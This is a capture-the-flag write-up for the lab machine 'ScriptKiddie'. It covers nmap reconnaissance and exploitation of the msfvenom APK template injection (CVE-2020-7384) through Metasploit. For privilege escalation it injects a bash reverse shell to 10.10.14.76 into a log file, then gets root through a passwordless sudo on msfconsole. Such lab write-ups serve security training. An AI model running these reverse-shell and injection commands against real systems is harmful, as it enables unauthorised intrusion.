# ScriptKiddie

## Nmap Scan
Let's start with a nmap scan to extract the open ports
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 09:38 EDT
Nmap scan report for 10.10.10.226
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/22%OT=22%CT=1%CU=40802%PV=Y%DS=2%DC=T%G=Y%TM=60817C7
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   148.11 ms 10.10.14.1
2   148.18 ms 10.10.10.226

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.09 seconds
```

We can see that the ports 5000 and 22 are open, 5000 for http and 22 for ssh

Open the following link in the browser : http://10.10.10.226:5000

![alt text](https://miro.medium.com/max/1050/1*kHKLfZcara8e5gh-YGbe1Q.png)

A very simple page with 3 sections, Nmap scan, msfvenom and searchSploit.
We can try command injection and file Upload vulnerability.
After some research we found that is APK template command injection vulnerability : CVE-2020-7384

## Metasploit
Let's create a payload with metasploit framework using the exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection module.
The generated payload is with .apk extension.
First, start a netcat listener on the port 5555
```
nc -nlvp 5555
```
Now we can upload the payload with the Android platform and our ip address.
In our machine, we can see that the reverse connection has been established.
User flag is in users.txt flag

## Privilege Escalation
In the logs directory, we can see that the file named hackers is owned by the group pwn, so we can execute commands with this group.
Now let's establish a reverse shell using this file.
Fisrt, start another netcat listener on the port 1234
```
nc -nlvp 1234
```
now in the box machine, run the following command :

```
echo "   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.76/1234 0>&1' #" >> hackers
```

BOOOOOOOOOM, the reverse connection has been made but this time with user pwn. But we need the root user, let's give a look at the sudo permissions with this command :
```
sudo -l
```
```
User pwn may run the following commands on ScriptKiddie:
  (root) NOPASSWORD: /opt/metasploit-framework-6.0.9/msfconsole
```

Nice, so we can run metasploit with root privileges and without a password
```
sudo msfconsole
```
get access to the shell
```
msf6>/bin/bash
```
now we are logged in with root user.
The system falg is located at root.txt file





